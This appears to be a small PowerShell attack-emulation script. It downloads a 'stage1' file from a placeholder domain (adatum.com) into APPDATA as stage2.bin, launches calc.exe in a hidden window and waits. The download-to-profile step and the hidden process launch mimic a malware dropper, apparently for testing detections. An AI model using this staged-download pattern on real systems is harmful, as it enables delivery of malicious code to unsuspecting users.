[CmdletBinding()]
param(
    [string]$Stage1Url = "https://adatum.com/stage1.ps1",
    [string]$PayloadPath = "$env:APPDATA\stage2.bin"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $PayloadPath)
Start-Process -FilePath 'calc.exe' -WindowStyle Hidden
Start-Sleep -Seconds 28
